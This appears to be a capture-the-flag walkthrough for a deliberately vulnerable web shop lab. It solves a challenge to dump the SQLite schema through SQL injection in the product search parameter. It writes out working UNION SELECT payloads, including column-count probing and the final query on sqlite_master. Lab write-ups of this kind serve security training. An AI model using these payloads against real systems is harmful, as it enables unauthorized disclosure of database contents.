## Database Schema
### Challenge: Exfiltrate the entire DB schema definition via SQL Injection.

1. Visit http://\<vm_ip\>:3000/rest/products/search in browser.
2. In the `?q=` search parameter, inject `'))` to output SQLITE error.
3. Visit https://www.sqlite.org/faq.html to learn in "(7) How do I list all tables/indices contained in an SQLite database" that the schema is stored in a system table `sqlite_master`.
4. You will also learn that this table contains a column sql which holds the text of the original CREATE TABLE or CREATE INDEX statement that created the table or index. You will need the sql column to replicate the entire DB schema.
5. In the `?q=` search parameter, inject `'))--` to dump the products table.
6. Searching for `')) UNION SELECT * FROM sqlite_master--` fails with promising error that confirms we have selection on `sqlite_master` table but not right amount of columns.
7. Start with 
  ``` ')) UNION SELECT '1' FROM sqlite_master-- ```
  then add colums e.g.
  ``` ')) UNION SELECT '1', '2' FROM sqlite_master-- ```
  until the following query
  ``` ')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- ```
  dumps the products table and an extra element
  ``` {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"} ```
8. Get rid of the unwanted product results by switching the query parameter with `'qwert'))` plus the union select.
  ```qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--```
9. Replace the correct column with `sql` to dump the DB schema.
  ```qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--```
10. Visit http://\<vm_ip\>:3000/ to solve this challenge 
